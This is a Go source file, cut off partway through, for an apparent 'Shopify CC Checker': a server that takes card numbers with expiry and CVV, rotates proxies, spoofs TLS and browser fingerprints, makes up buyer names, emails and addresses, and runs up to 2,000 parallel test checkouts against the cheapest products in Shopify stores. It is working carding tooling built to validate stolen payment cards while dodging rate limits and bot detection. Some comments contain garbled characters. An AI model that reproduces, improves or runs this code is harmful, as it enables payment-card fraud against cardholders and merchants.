package main

// Shopify CC Checker ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â Single-file Go port of api.py + sh_checker.py
// TLS/HTTP2 fingerprint spoofing via bogdanfinn/tls-client (Chrome_120)
// Handles 2 000 parallel goroutines; semaphore-limited pool.
//
// Endpoint:
//   GET http://0.0.0.0:8081/?5455122802569146|12|26|543&proxy=host:port:user:pass

import (
        "bufio"
        "bytes"
        "context"
        "encoding/json"
        "fmt"
        "io"
        "log"
        "math"
        "math/rand"
        "crypto/tls"
        "net"
        "net/http"
        "net/http/cookiejar"
        "net/url"
        "os"
        "regexp"
        "runtime"
        "strconv"
        "strings"
        "sync"
        "sync/atomic"
        "time"

        fhttp "github.com/bogdanfinn/fhttp"
        tlsclient "github.com/bogdanfinn/tls-client"
        "github.com/bogdanfinn/tls-client/profiles"
)

// GraphQL Queries ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â copied verbatim from sh_checker.py

// Address book + UA profiles (exact port from sh_checker.py)

// Persisted GraphQL operation IDs (extracted from Shopify checkout-web JS bundles).
// Shopify removed inline GraphQL query support; these IDs reference server-stored queries.
// Mirrors checkout_engine.py's _HARDCODED_OP_IDS (2026-10-02).
const (
        opIDProposal            = "cd1c759d6c8ca754f501a6b4e91684ad8ba1553095acc86b54bb3aa840587dae"
        opIDSubmitForCompletion = "51ea6a6dd873dd6e77892cb78b9f9574626169f1f664e3914f21b280f80ac4d9"
        opIDPollForReceipt      = "658bb809ab07c0463243990c0c79fd8f2eacb112e7ea5c8f2cef6bc7b109127a"
)

type Address struct {
        Address1    string
        City        string
        PostalCode  string
        ZoneCode    string
        CountryCode string
        Phone       string
}

var addressBook = map[string][]Address{
        "US": {
                {"350 Fifth Ave", "New York", "10118", "NY", "US", "2125550100"},
                {"233 S Wacker Dr", "Chicago", "60606", "IL", "US", "3125550147"},
                {"1 Apple Park Way", "Cupertino", "95014", "CA", "US", "4085550100"},
                {"888 Brickell Ave", "Miami", "33131", "FL", "US", "3055550189"},
                {"100 Main St", "Houston", "77002", "TX", "US", "7135550142"},
                {"3180 W Sahara Ave", "Las Vegas", "89102", "NV", "US", "7025550198"},
                {"700 N Brand Blvd", "Glendale", "91203", "CA", "US", "8185550173"},
                {"1600 Pennsylvania Ave", "Washington", "20500", "DC", "US", "2025550100"},
        },
        "CA": {
                {"88 Queen St W", "Toronto", "M5H 2M4", "ON", "CA", "4165550198"},
                {"1055 W Georgia St", "Vancouver", "V6E 3P3", "BC", "CA", "6045550100"},
                {"1000 De La Commune", "Montreal", "H2L 1X3", "QC", "CA", "5145550145"},
                {"10123 99 St NW", "Edmonton", "T5J 3H1", "AB", "CA", "7805550110"},
        },
        "GB": {
                {"221B Baker St", "London", "NW1 6XE", "ENG", "GB", "2079460123"},
                {"1 Piccadilly", "London", "W1J 0DA", "ENG", "GB", "2074990234"},
                {"30 St Mary Axe", "London", "EC3A 8BF", "ENG", "GB", "2070717234"},
                {"12 George St", "Edinburgh", "EH2 2PF", "SCT", "GB", "1315550102"},
                {"5 Park Place", "Cardiff", "CF10 3DP", "WLS", "GB", "2920550191"},
        },
        "AU": {
                {"1 Martin Place", "Sydney", "2000", "NSW", "AU", "291234567"},
                {"120 Collins St", "Melbourne", "3000", "VIC", "AU", "396541234"},
                {"45 Eagle St", "Brisbane", "4000", "QLD", "AU", "732210000"},
                {"250 St Georges Tce", "Perth", "6000", "WA", "AU", "893211234"},
        },
        "IN": {
                {"221B MG Road", "Mumbai", "400001", "MH", "IN", "2222625757"},
                {"15 Brigade Road", "Bangalore", "560001", "KA", "IN", "8022221000"},
                {"10 Connaught Place", "New Delhi", "110001", "DL", "IN", "1123341234"},
                {"32 Anna Salai", "Chennai", "600002", "TN", "IN", "4428415678"},
                {"1 Park St", "Kolkata", "700016", "WB", "IN", "3322001234"},
        },
        "AE": {
                {"Burj Khalifa Tower", "Dubai", "00000", "DU", "AE", "97143231234"},
                {"Al Maryah Island", "Abu Dhabi", "00000", "AZ", "AE", "97126969696"},
                {"Hamdan St 55", "Dubai", "00000", "DU", "AE", "97143551234"},
        },
        "HK": {
                {"88 Queensway", "Admiralty", "999077", "HK", "HK", "85228689111"},
                {"Nathan Road 100", "Kowloon", "999077", "KL", "HK", "85227216688"},
        },
        "CN": {
                {"8 Zhongguancun St", "Beijing", "100080", "11", "CN", "1062512345"},
                {"100 Century Ave", "Shanghai", "200120", "31", "CN", "2150504000"},
        },
        "CH": {
                {"Gotthardstrasse 17", "Zurich", "8002", "ZH", "CH", "442012000"},
                {"Rue du Rhone 48", "Geneva", "1204", "GE", "CH", "227083300"},
        },
        "DE": {
                {"Unter den Linden 77", "Berlin", "10117", "BE", "DE", "3020450"},
                {"Maximilianstr 5", "Munich", "80539", "BY", "DE", "8921230"},
                {"Kaiserstr 10", "Frankfurt", "60311", "HE", "DE", "6921230"},
        },
        "FR": {
                {"1 Ave des Champs-Elysees", "Paris", "75008", "IDF", "FR", "140695000"},
                {"20 Rue de la Paix", "Paris", "75002", "IDF", "FR", "142333333"},
                {"3 Quai Sarrail", "Lyon", "69006", "ARA", "FR", "472406040"},
        },
        "NL": {
                {"Dam 1", "Amsterdam", "1012 JS", "NH", "NL", "2055000200"},
                {"Binnenhof 1A", "The Hague", "2513 AA", "ZH", "NL", "703564434"},
        },
        "SG": {
                {"1 Raffles Place", "Singapore", "048616", "SG", "SG", "65350001"},
                {"8 Marina View", "Singapore", "018960", "SG", "SG", "65350002"},
        },
        "JP": {
                {"2-1 Marunouchi", "Tokyo", "100-0005", "13", "JP", "332138888"},
                {"1-chome Namba", "Osaka", "542-0076", "27", "JP", "662414101"},
        },
        "MX": {
                {"Paseo de la Reforma 505", "Mexico City", "06600", "CMX", "MX", "5555550100"},
                {"Av Constitucion 1065", "Monterrey", "64000", "NLE", "MX", "8183330100"},
        },
        "SE": {{"Drottninggatan 53", "Stockholm", "111 21", "AB", "SE", "86790000"}},
        "NO": {{"Karl Johans Gate 22", "Oslo", "0026", "03", "NO", "22341000"}},
        "DK": {{"Stroget 5", "Copenhagen", "1001", "84", "DK", "33150000"}},
        "NZ": {
                {"1 Queen St", "Auckland", "1010", "AUK", "NZ", "93090000"},
                {"148 Lambton Quay", "Wellington", "6011", "WGN", "NZ", "44990000"},
                {"75 Cashel St", "Christchurch", "8011", "CAN", "NZ", "33660000"},
                {"50 Princes St", "Dunedin", "9016", "OTA", "NZ", "34774000"},
        },
}

var defaultAddresses = []Address{
        {"350 Fifth Ave", "New York", "10118", "NY", "US", "2125550100"},
        {"233 S Wacker Dr", "Chicago", "60606", "IL", "US", "3125550147"},
        {"1 Apple Park Way", "Cupertino", "95014", "CA", "US", "4085550100"},
        {"888 Brickell Ave", "Miami", "33131", "FL", "US", "3055550189"},
}

// Currency ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ country code
var currencyToCountry = map[string]string{
        "USD": "US", "GBP": "GB", "CAD": "CA",
        "CHF": "CH", "AUD": "AU", "EUR": "DE",
        "JPY": "JP", "SGD": "SG", "CNY": "CN",
        "NZD": "NZ", "MXN": "MX", "SEK": "SE",
        "NOK": "NO", "DKK": "DK",
        "INR": "IN", "HKD": "HK", "AED": "AE",
}

// deliveryFallbackCC mirrors api.py's _FALLBACK_CC:
// when a site can't deliver to the detected country, try this fallback.
var deliveryFallbackCC = map[string]string{
        "NZ": "AU", "AU": "US", "GB": "US", "DE": "US",
        "FR": "US", "JP": "US", "IN": "US", "SG": "US",
        "HK": "US", "CN": "US", "AE": "US", "CA": "US",
        "SE": "US", "NO": "US", "DK": "US", "MX": "US",
        "CH": "US",
}

// UA profile: ua, sec-ch-ua, sec-ch-ua-mobile, sec-ch-ua-platform
type UAProfile struct {
        UA         string
        ChUA       string // empty = Safari/no client hints
        ChMobile   string
        ChPlatform string
}

var uaProfiles = []UAProfile{
        {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", `"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"`, "?0", `"macOS"`},
        {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", `"Chromium";v="146", "Google Chrome";v="146", "Not-A.Brand";v="24"`, "?0", `"macOS"`},
        {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`, "?0", `"macOS"`},
        {"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15", "", "", ""},
        {"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15", "", "", ""},
        {"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15", "", "", ""},
        {"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1", "", "", ""},
        {"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1", "", "", ""},
        {"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6.1 Mobile/15E148 Safari/604.1", "", "", ""},
        {"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.88 Mobile/15E148 Safari/604.1", "", "", ""},
        {"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1", "", "", ""},
        {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", `"Chromium";v="146", "Google Chrome";v="146", "Not-A.Brand";v="24"`, "?0", `"Windows"`},
        {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`, "?0", `"Windows"`},
        {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", `"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"`, "?0", `"Windows"`},
}

var (
        firstNames = []string{
                "James", "John", "Robert", "Michael", "William", "David", "Richard",
                "Joseph", "Thomas", "Charles", "Christopher", "Daniel", "Matthew",
                "Anthony", "Mark", "Donald", "Steven", "Paul", "Andrew", "Kenneth",
                "Joshua", "Kevin", "Brian", "George", "Timothy", "Ronald", "Edward",
                "Jason", "Jeffrey", "Ryan", "Jacob", "Gary", "Nicholas", "Eric",
                "Jonathan", "Stephen", "Larry", "Justin", "Scott", "Brandon",
                "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Susan", "Jessica",
                "Sarah", "Karen", "Lisa", "Nancy", "Betty", "Margaret", "Sandra",
                "Ashley", "Dorothy", "Kimberly", "Emily", "Donna", "Michelle", "Carol",
                "Amanda", "Melissa", "Deborah", "Stephanie", "Rebecca", "Sharon",
                "Laura", "Cynthia", "Kathleen", "Amy", "Angela", "Shirley", "Anna",
                "Brenda", "Pamela", "Emma", "Nicole", "Helen", "Samantha", "Katherine",
                "Christine", "Debra", "Rachel", "Carolyn", "Janet", "Catherine", "Maria",
        }
        lastNames = []string{
                "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
                "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez",
                "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin",
                "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark",
                "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King",
                "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green",
                "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell",
                "Carter", "Roberts", "Turner", "Phillips", "Evans", "Collins", "Stewart",
                "Morris", "Murphy", "Cook", "Rogers", "Gutierrez", "Ortiz", "Morgan",
                "Cooper", "Peterson", "Bailey", "Reed", "Kelly", "Howard", "Ramos",
                "Kim", "Cox", "Ward", "Richardson", "Watson", "Brooks", "Chavez",
                "Wood", "James", "Bennett", "Gray", "Mendoza", "Ruiz", "Hughes",
                "Price", "Butler", "Foster", "Bryant", "Alexander", "Russell", "Griffin",
                "Diaz", "Hayes", "Myers", "Ford", "Hamilton", "Graham", "Sullivan",
        }
        emailDomains = []string{
                "gmail.com", "yahoo.com", "outlook.com", "hotmail.com",
                "icloud.com", "me.com", "mac.com",
                "protonmail.com", "pm.me",
                "aol.com", "live.com", "msn.com",
        }
        acceptLangs = []string{
                "en-US,en;q=0.9",
                "en-GB,en;q=0.9,en-US;q=0.8",
                "en-US,en;q=0.8,en-GB;q=0.6",
        }
)

// Global state

var apiStartTime = time.Now()

var (
        sites        []string
        sitesAtom    atomic.Value // stores []string — zero-lock hot path
        sitesMu      sync.RWMutex
        binCache     sync.Map // string ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ BINInfo
        // pciSemaphore caps concurrent vault POSTs to checkout.pci.shopifyinc.com.
        // CF rate-limits per source IP. If you rotate proxies (each check uses a
        // different exit IP) raise this freely. Without proxy rotation keep ≤ 50
        // per instance to avoid 429 storms.
        // Default: 500 — assumes proxy rotation is active.
        pciSemaphore = make(chan struct{}, 500)
        tlsProfiles  = []profiles.ClientProfile{
                profiles.Chrome_120,
                profiles.Chrome_124,
                profiles.Chrome_131,
                profiles.Firefox_120,
                profiles.Safari_IOS_17_0,
        }
)

// workerSem caps concurrent card-check goroutines at maxWorkers.
// Non-blocking acquire: if full -> 503 immediately so bot routes to next node.
var workerSem = make(chan struct{}, maxWorkers)

// activeWorkers is the REAL in-flight counter for /health.
// runtime.NumGoroutine() reports thousands of Go runtime goroutines - NOT card checks.
var activeWorkers atomic.Int64

const (
        // maxWorkers = total goroutine cap across all endpoints.
        // Go goroutines blocked on I/O cost ~2–8 KB stack each.
        // 2000 workers × 8 KB = 16 MB — trivial on a 2 GB+ container.
        // With 12 instances and 100 concurrent users this gives each
        // instance a 2000-slot buffer before it returns 503.
        maxWorkers = 2000
        // batchWorkers = per-batch goroutine cap.
        batchWorkers = 1000
        // maxRetries = how many times to retry with a fresh site on infra/site errors.
        maxRetries = 3
        // httpTimeoutSec = per-request timeout for TLS client HTTP calls.
        // Lower than original 20s for faster failure detection under heavy load.
        httpTimeoutSec = 15
        // vaultTimeoutSec = PCI vault endpoint timeout (slightly higher for CF cold starts).
        vaultTimeoutSec = 18
        // maxIdleConnsPerHost = keep-alive pool size per Shopify host.
        // Critical for performance: reusing TLS connections avoids expensive handshakes.
        maxIdleConnsPerHost = 200
        // maxConnsPerHost = upper bound on concurrent connections to a single host.
        // 0 = unlimited (Go default). We set explicit cap to avoid FD exhaustion.
        maxConnsPerHost = 0
)

// Utility helpers

func pickUAProfile() UAProfile { return uaProfiles[rand.Intn(len(uaProfiles))] }

func pickAddr(rawURL string) Address {
        u, err := url.Parse(rawURL)
        tld := ""
        if err == nil {
                parts := strings.Split(u.Hostname(), ".")
                if len(parts) > 0 {
                        tld = strings.ToUpper(parts[len(parts)-1])
                }
        }
        if addrs, ok := addressBook[tld]; ok {
                return addrs[rand.Intn(len(addrs))]
        }
        return defaultAddresses[rand.Intn(len(defaultAddresses))]
}

func pickAddrByCountry(cc string) Address {
        if addrs, ok := addressBook[strings.ToUpper(cc)]; ok {
                return addrs[rand.Intn(len(addrs))]
        }
        return defaultAddresses[rand.Intn(len(defaultAddresses))]
}

func randomName() (string, string) {
        return firstNames[rand.Intn(len(firstNames))], lastNames[rand.Intn(len(lastNames))]
}

func generateEmail(first, last string) string {
        n := rand.Intn(999) + 1
        variants := []string{
                strings.ToLower(first) + "." + strings.ToLower(last),
                strings.ToLower(first) + strings.ToLower(last),
                strings.ToLower(first) + strings.ToLower(last) + strconv.Itoa(n),
                strings.ToLower(string(first[0])) + strings.ToLower(last),
                strings.ToLower(string(first[0])) + strings.ToLower(last) + strconv.Itoa(n),
                strings.ToLower(first) + "_" + strings.ToLower(last),
                strings.ToLower(last) + "." + strings.ToLower(first),
        }
        return variants[rand.Intn(len(variants))] + "@" + emailDomains[rand.Intn(len(emailDomains))]
}

func buildProxyURL(proxyStr string) string {
        if proxyStr == "" {
                return ""
        }
        s := strings.TrimSpace(proxyStr)
        if strings.HasPrefix(s, "http://") || strings.HasPrefix(s, "https://") || strings.HasPrefix(s, "socks") {
                return s
        }
        parts := strings.Split(s, ":")
        switch len(parts) {
        case 2:
                return "http://" + s
        case 4:
                return fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
        case 3:
                return "http://" + s
        }
        return "http://" + s
}

func extractBetween(text, start, end string) string {
        idx := strings.Index(text, start)
        if idx == -1 {
                return ""
        }
        rest := text[idx+len(start):]
        idx2 := strings.Index(rest, end)
        if idx2 == -1 {
                return ""
        }
        return rest[:idx2]
}

func isCaptchaRequired(text string) bool {
        up := strings.ToUpper(text)
        for _, kw := range []string{"CAPTCHA_REQUIRED", `"CODE":"CAPTCHA_REQUIRED"`, "CAPTCHA CHALLENGE", "HCAPTCHA", "H-CAPTCHA"} {
                if strings.Contains(up, kw) {
                        return true
                }
        }
        return false
}

// sanitizeMsg converts captcha messages and bare generic codes to CARD_DECLINED.
// Acts as the final safety net — no "UNKNOWN", "ERROR", etc. ever reach the API response.
func sanitizeMsg(msg string) string {
        if isCaptchaRequired(msg) {
                return "CARD_DECLINED"
        }
        if genericCodes[strings.ToUpper(strings.TrimSpace(msg))] {
                return "CARD_DECLINED"
        }
        return msg
}

// extractCleanResponse returns a short response code from a raw message
var _codeRe = regexp.MustCompile(`(?i)(PAYMENTS_[A-Z_]+|CARD_[A-Z_]+|[A-Z]+_[A-Z]+_[A-Z_]+|[A-Z]+_[A-Z_]+)`)
var _codeRe2 = regexp.MustCompile(`(?i)code["']?\s*[:=]\s*["']?([^"',]+)["']?`)

// genericCodes are bare Shopify codes that carry no real bank info — map to CARD_DECLINED
var genericCodes = map[string]bool{
        "UNKNOWN": true, "UNKNOWN_ERROR": true, "GENERIC_ERROR": true,
        "PAYMENT_FAILED": true, "ERROR": true, "FAILED": true,
}

func extractCleanResponse(msg string) string {
        if msg == "" {
                return "UNKNOWN_ERROR"
        }
        up := strings.ToUpper(strings.TrimSpace(msg))
        if genericCodes[up] {
                return "CARD_DECLINED"
        }
        if m := _codeRe.FindString(msg); m != "" && strings.Contains(m, "_") && len(m) < 50 {
                cleaned := strings.Trim(m, `{}:'" `)
                if genericCodes[strings.ToUpper(cleaned)] {
                        return "CARD_DECLINED"
                }
                return cleaned
        }
        if ms := _codeRe2.FindStringSubmatch(msg); len(ms) > 1 {
                v := strings.TrimSpace(ms[1])
                if strings.Contains(v, "_") && len(v) < 50 {
                        if genericCodes[strings.ToUpper(v)] {
                                return "CARD_DECLINED"
                        }
                        return v
                }
        }
        if len(msg) > 50 {
                return msg[:50]
        }
        return msg
}

func parseHostname(rawURL string) string {
        u, err := url.Parse(rawURL)
        if err != nil {
                return rawURL
        }
        return u.Hostname()
}

// TLS client builder ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â Chrome_120 fingerprint (or random from pool)

func newTLSClient(proxyURL string) (tlsclient.HttpClient, error) {
        profile := tlsProfiles[rand.Intn(len(tlsProfiles))]
        idleTimeout := 60 * time.Second
        opts := []tlsclient.HttpClientOption{
                tlsclient.WithTimeoutSeconds(httpTimeoutSec),
                tlsclient.WithClientProfile(profile),
                tlsclient.WithRandomTLSExtensionOrder(),
                tlsclient.WithInsecureSkipVerify(),
                tlsclient.WithCookieJar(tlsclient.NewCookieJar()),
                // Connection pool tuning for high concurrency.
                // Without these, each request opens a fresh TLS connection (~300ms handshake).
                // Reusing keep-alive connections is the single biggest perf win under load.
                tlsclient.WithTransportOptions(&tlsclient.TransportOptions{
                        MaxIdleConns:        maxIdleConnsPerHost * 2,
                        MaxIdleConnsPerHost: maxIdleConnsPerHost,
                        MaxConnsPerHost:     maxConnsPerHost,
                        IdleConnTimeout:     &idleTimeout,
                }),
        }
        if proxyURL != "" {
                opts = append(opts, tlsclient.WithProxyUrl(proxyURL))
        }
        return tlsclient.NewHttpClient(tlsclient.NewNoopLogger(), opts...)
}

// doGQLRequest sends a POST GraphQL request via the spoofed TLS client.
// Retries once on 429 / 503 with a short sleep.
func doGQLRequest(client tlsclient.HttpClient, gqlURL string, params map[string]string, headers map[string]string, body map[string]interface{}) (int, string, error) {
        bodyBytes, _ := json.Marshal(body)

        buildReq := func() (*fhttp.Request, error) {
                req, err := fhttp.NewRequest("POST", gqlURL, bytes.NewReader(bodyBytes))
                if err != nil {
                        return nil, err
                }
                req.Header = fhttp.Header{
                        "content-type": []string{"application/json"},
                        "accept":       []string{"application/json, text/plain, */*"},
                        fhttp.HeaderOrderKey: []string{
                                "content-type", "accept", "accept-language",
                                "origin", "referer", "user-agent",
                                "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
                                "sec-fetch-dest", "sec-fetch-mode", "sec-fetch-site",
                                "shopify-checkout-client", "shopify-checkout-source",
                                "x-checkout-one-session-token",
                                "x-checkout-web-build-id", "x-checkout-web-deploy-stage",
                                "x-checkout-web-server-handling", "x-checkout-web-server-rendering",
                                "x-checkout-web-source-id",
                        },
                }
                for k, v := range headers {
                        req.Header.Set(k, v)
                }
                if len(params) > 0 {
                        q := req.URL.Query()
                        for k, v := range params {
                                q.Set(k, v)
                        }
                        req.URL.RawQuery = q.Encode()
                }
                return req, nil
        }

        doOnce := func() (int, string, error) {
                req, err := buildReq()
                if err != nil {
                        return 0, "", err
                }
                resp, err := client.Do(req)
                if err != nil {
                        return 0, "", err
                }
                defer resp.Body.Close()
                rb, _ := io.ReadAll(resp.Body)
                return resp.StatusCode, string(rb), nil
        }

        sc, txt, err := doOnce()
        if err == nil && (sc == 429 || sc == 503) {
                // Jittered back-off: 800–1600 ms. Fixed 1500 ms wastes throughput
                // on a fast retry that would have succeeded at 800 ms.
                time.Sleep(time.Duration(800+rand.Intn(800)) * time.Millisecond)
                sc, txt, err = doOnce()
        }
        return sc, txt, err
}

// Product fetching

type ProductResult struct {
        Site             string
        Price            string
        VariantID        string
        RequiresShipping bool
}

var skipProductTypes = map[string]bool{
        "gift card": true, "gift cards": true, "gift_card": true, "gift_cards": true,
        "e-gift card": true, "egift card": true, "donation": true, "e-gift": true, "egift": true,
}
var skipHandleKeywords = []string{"gift-card", "giftcard", "gift_card", "e-gift", "egift", "donation"}

func fetchProducts(domain, proxyStr string) (*ProductResult, error) {
        if !strings.HasPrefix(domain, "http") {
                domain = "https://" + domain
        }
        proxyURL := buildProxyURL(proxyStr)

        tryFetch := func(px string) ([]map[string]interface{}, error) {
                client, err := newTLSClient(px)
                if err != nil {
                        return nil, err
                }
                uap := uaProfiles[rand.Intn(len(uaProfiles))]
                req, _ := fhttp.NewRequest("GET", domain+"/products.json?limit=250", nil)
                req.Header = fhttp.Header{
                        "user-agent":      []string{uap.UA},
                        "accept":          []string{"application/json, text/javascript, */*; q=0.01"},
                        "accept-language": []string{"en-US,en;q=0.9"},
                        "referer":         []string{domain + "/"},
                        "sec-fetch-dest":  []string{"empty"},
                        "sec-fetch-mode":  []string{"cors"},
                        "sec-fetch-site":  []string{"same-origin"},
                        fhttp.HeaderOrderKey: []string{
                                "user-agent", "accept", "accept-language", "referer",
                                "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
                                "sec-fetch-dest", "sec-fetch-mode", "sec-fetch-site",
                        },
                }
                if uap.ChUA != "" {
                        req.Header.Set("sec-ch-ua", uap.ChUA)
                        req.Header.Set("sec-ch-ua-mobile", uap.ChMobile)
                        req.Header.Set("sec-ch-ua-platform", uap.ChPlatform)
                }
                ctx, cancel := context.WithTimeout(context.Background(), 17*time.Second)
                defer cancel()
                req = req.WithContext(ctx)
                resp, err := client.Do(req)
                if err != nil {
                        return nil, err
                }
                defer resp.Body.Close()
                // 429 / 503 â†’ wait and retry once
                if resp.StatusCode == 429 || resp.StatusCode == 503 {
                        io.Copy(io.Discard, resp.Body)
                        // Jittered back-off 600–1400 ms — faster recovery on transient 429.
                        time.Sleep(time.Duration(600+rand.Intn(800)) * time.Millisecond)
                        req2, _ := fhttp.NewRequest("GET", domain+"/products.json?limit=250", nil)
                        req2.Header = req.Header
                        ctx2, cancel2 := context.WithTimeout(context.Background(), 17*time.Second)
                        defer cancel2()
                        req2 = req2.WithContext(ctx2)
                        resp2, err2 := client.Do(req2)
                        if err2 != nil {
                                return nil, err2
                        }
                        resp = resp2
                }
                if resp.StatusCode != 200 {
                        return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
                }
                var data map[string]interface{}
                if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
                        return nil, err
                }
                prods, _ := data["products"].([]interface{})
                var out []map[string]interface{}
                for _, p := range prods {
                        if pm, ok := p.(map[string]interface{}); ok {
                                out = append(out, pm)
                        }
                }
                return out, nil
        }

        var products []map[string]interface{}
        var fetchErr error
        if proxyURL != "" {
                products, fetchErr = tryFetch(proxyURL)
        }
        if fetchErr != nil || products == nil {
                products, fetchErr = tryFetch("")
        }
        if fetchErr != nil {
                return nil, fmt.Errorf("site error: %s", fetchErr.Error())
        }
        if len(products) == 0 {
                return nil, fmt.Errorf("no products found")
        }

        scan := func(skipUnavail bool) *ProductResult {
                bestPrice := float64(-1)
                var best *ProductResult
                for _, prod := range products {
                        ptype := strings.ToLower(fmt.Sprintf("%v", prod["product_type"]))
                        handle := strings.ToLower(fmt.Sprintf("%v", prod["handle"]))
                        if skipProductTypes[ptype] {
                                continue
                        }
                        skip := false
                        for _, kw := range skipHandleKeywords {
                                if strings.Contains(handle, kw) {
                                        skip = true
                                        break
                                }
                        }
                        if skip {
                                continue
                        }
                        variants, _ := prod["variants"].([]interface{})
                        for _, v := range variants {
                                vm, ok := v.(map[string]interface{})
                                if !ok {
                                        continue
                                }
                                // Always skip variants that are explicitly marked unavailable (available:false).
                                // When skipUnavail=false we still respect the explicit false — only
                                // include variants where available is missing/non-boolean (no inventory tracking).
                                if avail, ok := vm["available"].(bool); ok && !avail {
                                        continue
                                }
                                if rsp, ok := vm["requires_selling_plan"].(bool); ok && rsp {
                                        continue
                                }
                                priceStr := fmt.Sprintf("%v", vm["price"])
                                priceStr = strings.ReplaceAll(priceStr, ",", "")
                                price, err := strconv.ParseFloat(priceStr, 64)
                                if err != nil || price <= 0 {
                                        continue
                                }
                                ships := true
                                if rs, ok := vm["requires_shipping"].(bool); ok {
                                        ships = rs
                                }
                                if bestPrice < 0 || price < bestPrice {
                                        bestPrice = price
                                        // vm["id"] comes from JSON as float64; must render as integer
                                        vidStr := ""
                                        switch vid := vm["id"].(type) {
                                        case float64:
                                                vidStr = strconv.FormatInt(int64(vid), 10)
                                        case json.Number:
                                                vidStr = vid.String()
                                        default:
                                                vidStr = fmt.Sprintf("%v", vid)
                                        }
                                        best = &ProductResult{
                                                Site:             domain,
                                                Price:            fmt.Sprintf("%.2f", price),
                                                VariantID:        vidStr,
                                                RequiresShipping: ships,
                                        }
                                }
                        }
                }
                return best
        }

        if r := scan(true); r != nil {
                return r, nil
        }
        if r := scan(false); r != nil {
                return r, nil
        }
        return nil, fmt.Errorf("no valid products with price > 0")
}

// fetchProductsPhysical fetches the cheapest physical (requires_shipping=true) variant.
// Used as a fallback when a digital checkout triggers REQUIRED_ARTIFACTS_UNAVAILABLE.
func fetchProductsPhysical(domain, proxyStr string) (*ProductResult, error) {
        res, err := fetchProducts(domain, proxyStr)
        if err != nil {
                return nil, err
        }
        // If the best pick already ships, return it directly.
        if res != nil && res.RequiresShipping {
                return res, nil
        }
        // Otherwise re-fetch with physicalOnly scan
        proxyURL := buildProxyURL(proxyStr)
        tryFetch2 := func(px string) ([]map[string]interface{}, error) {
                client2, e2 := newTLSClient(px)
                if e2 != nil {
                        return nil, e2
                }
                uap2 := uaProfiles[rand.Intn(len(uaProfiles))]
                req2, _ := fhttp.NewRequest("GET", domain+"/products.json?limit=250", nil)
                req2.Header = fhttp.Header{
                        "user-agent":      []string{uap2.UA},
                        "accept":          []string{"application/json"},
                        "accept-language": []string{"en-US,en;q=0.9"},
                        fhttp.HeaderOrderKey: []string{"user-agent", "accept", "accept-language"},
                }
                resp2, e2 := client2.Do(req2)
                if e2 != nil {
                        return nil, e2
                }
                defer resp2.Body.Close()
                var d2 map[string]interface{}
